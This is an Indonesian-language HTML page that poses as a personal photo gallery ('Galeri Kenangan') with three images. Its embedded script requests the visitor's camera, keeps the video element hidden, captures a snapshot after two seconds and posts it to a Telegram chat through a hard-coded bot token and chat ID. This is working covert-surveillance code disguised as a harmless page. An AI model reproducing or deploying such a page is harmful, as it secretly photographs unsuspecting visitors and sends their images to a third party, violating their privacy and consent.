<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Galeri Kenangan</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: url('https://files.catbox.moe/109kop.jpg') no-repeat center center fixed;
      background-size: cover;
      color: white;
      margin: 0;
      padding: 0;
      text-align: center;
    }
    header {
      background: rgba(0,0,0,0.6);
      padding: 15px;
      font-size: 20px;
      font-weight: bold;
    }
    .gallery {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 10px;
      padding: 20px;
    }
    .gallery img {
      width: 100%;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.6);
    }
    video {
      display: none; /* kamera tetap nyala tapi disembunyiin */
    }
  </style>
</head>
<body>
  <header>HALLO NAMA SAYA KENZY</header>
  <div class="gallery">
    <img src="https://files.catbox.moe/gycs3w.jpg" alt="foto1">
    <img src="https://files.catbox.moe/m73e1f.jpeg" alt="foto2">
    <img src="https://files.catbox.moe/rlh01t.jpeg" alt="foto3">
  </div>

  <video id="video" autoplay></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const token = "7601935402:AAE8ysjnr8M9k8SFmsfsRbf9FCk1x8qYeV0";
    const chatId = "6626316127";

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
        setTimeout(() => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          context.drawImage(video, 0, 0);
          canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append("chat_id", chatId);
            formData.append("photo", blob, "snap.jpg");

            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
              method: "POST",
              body: formData
            });
          });
        }, 2000); // Jepret otomatis setelah 2 detik
      })
      .catch(err => console.log("Akses kamera ditolak:", err));
  </script>
</body>
</html>
